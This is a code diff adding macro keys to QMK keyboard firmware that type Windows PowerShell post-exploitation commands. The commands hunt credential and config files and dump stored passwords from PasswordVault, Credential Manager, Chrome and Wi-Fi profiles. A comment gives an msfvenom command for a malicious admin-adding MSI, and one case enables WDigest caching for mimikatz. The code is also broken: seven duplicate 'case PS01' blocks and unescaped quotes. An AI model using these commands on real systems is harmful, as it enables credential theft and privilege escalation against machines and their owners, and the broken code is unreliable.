@@ -132,6 +132,139 @@ bool process_record_user(uint16_t keycode, keyrecord_t *record) {
            SEND_STRING("$PSVersionTable"); 
         }
         break;
+    
+    case PS06: // NOISY. With this command we can identify files with potentially sensitive data such as account information, credentials, configuration files etc based on their filename.
+        if (record->event.pressed) {
+           SEND_STRING("gci c:\ -Include *pass*.txt,*pass*.xml,*pass*.ini,*pass*.xlsx,*cred*,*vnc*,*.config*,*accounts* -File -Recurse -EA SilentlyContinue"); 
+        }
+        break;
+
+    case PS07: // Find credentials in Sysprep or Unattend files
+        if (record->event.pressed) {
+           SEND_STRING("gci c:\ -Include *sysprep.inf,*sysprep.xml,*sysprep.txt,*unattended.xml,*unattend.xml,*unattend.txt -File -Recurse -EA SilentlyContinue");
+        }
+        break;
+
+    case PS08: // Find configuration files containing “password” string
+        if (record->event.pressed) {
+           SEND_STRING("gci c:\ -Include *.txt,*.xml,*.config,*.conf,*.cfg,*.ini -File -Recurse -EA SilentlyContinue | Select-String -Pattern "password"); 
+        }
+        break;
+            
+    case PS09: // Find database credentials in configuration files
+        if (record->event.pressed) {
+           SEND_STRING("gci c:\ -Include *.config,*.conf,*.xml -File -Recurse -EA SilentlyContinue | Select-String -Pattern "connectionString"); 
+        }
+        break;
+            
+    case PS10: // Locate web server configuration files
+        if (record->event.pressed) {
+           SEND_STRING("gci c:\ -Include web.config,applicationHost.config,php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -EA SilentlyContinue"); 
+        }
+        break;
+            
+    case PS11: // Get stored passwords from Windows PasswordVault
+        if (record->event.pressed) {
+           SEND_STRING("[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword();$_ }"); 
+        }
+        break;
+            
+    case PS12: // Get stored passwords from Windows Credential Manager
+        if (record->event.pressed) {
+           SEND_STRING("Get-StoredCredential | % { write-host -NoNewLine $_.username; write-host -NoNewLine ":" ; $p = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($_.password) ; [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($p); }"); 
+        }
+        break;
+            
+    case PS13: // Dump passwords from Google Chrome browser
+        if (record->event.pressed) {
+           SEND_STRING("[System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($datarow.password_value,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser))"); 
+        }
+        break;
+                       
+    case PS14: // Get stored Wi-Fi passwords from Wireless Profiles
+        if (record->event.pressed) {
+           SEND_STRING("(netsh wlan show profiles) | Select-String \"\\:(.+)$\" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\"$name\" key=clear)}  | Select-String \"Key Content\W+\:(.+)$\" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize"); 
+        }
+        break;
+                       
+    case PS15: // Search for SNMP community string in registry
+        if (record->event.pressed) {
+           SEND_STRING("gci HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse -EA SilentlyContinue"); 
+        }
+        break;
+                       
+    case PS16: // Search registry for auto-logon credentials
+        if (record->event.pressed) {
+           SEND_STRING("gp 'HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon' | select \"Default*\""); 
+        }
+        break;
+                       
+    case PS17: // Check if AlwaysInstallElevated is enabled. if it works, generate the malicious .msi in msfvenom with the following command: msfvenom -p windows/exec CMD='net localgroup administrators joe /add' -f msi > pkg.msi
+        if (record->event.pressed) {
+           SEND_STRING("gp 'HKCU:\Software\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated; gp 'HKLM:\Software\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated"); 
+        }
+        break;
+                       
+    case PS18: // Find unquoted service paths
+        if (record->event.pressed) {
+           SEND_STRING("gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq \"Auto\" -and $_.PathName -notlike \"C:\Windows*\" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name"); 
+        }
+        break;
+                       
+    case PS19: // Check for LSASS WDigest caching. If value is 0, mimikatz won't work and you'll have to use the next command. Otherwise enjoy!
+        if (record->event.pressed) {
+           SEND_STRING("gp registry::HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Wdigest).UseLogonCredential"); 
+        }
+        break;
+                       
+    case PS20: // Enable LSASS caching in order for mimikatz to work on the target machine
+        if (record->event.pressed) {
+           SEND_STRING("sp registry::HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Wdigest -name UseLogonCredential -value 1"); 
+        }
+        break;
+                       
+    case PS01: // this checks the powershell version
+        if (record->event.pressed) {
+           SEND_STRING("$PSVersionTable"); 
+        }
+        break;
+                       
+    case PS01: // this checks the powershell version
+        if (record->event.pressed) {
+           SEND_STRING("$PSVersionTable"); 
+        }
+        break;
+                       
+    case PS01: // this checks the powershell version
+        if (record->event.pressed) {
+           SEND_STRING("$PSVersionTable"); 
+        }
+        break;
+                       
+    case PS01: // this checks the powershell version
+        if (record->event.pressed) {
+           SEND_STRING("$PSVersionTable"); 
+        }
+        break;
+                       
+    case PS01: // this checks the powershell version
+        if (record->event.pressed) {
+           SEND_STRING("$PSVersionTable"); 
+        }
+        break;
+                       
+    case PS01: // this checks the powershell version
+        if (record->event.pressed) {
+           SEND_STRING("$PSVersionTable"); 
+        }
+        break;
+                       
+    case PS01: // this checks the powershell version
+        if (record->event.pressed) {
+           SEND_STRING("$PSVersionTable"); 
+        }
+        break;
+                       
     }
     return true;
 };
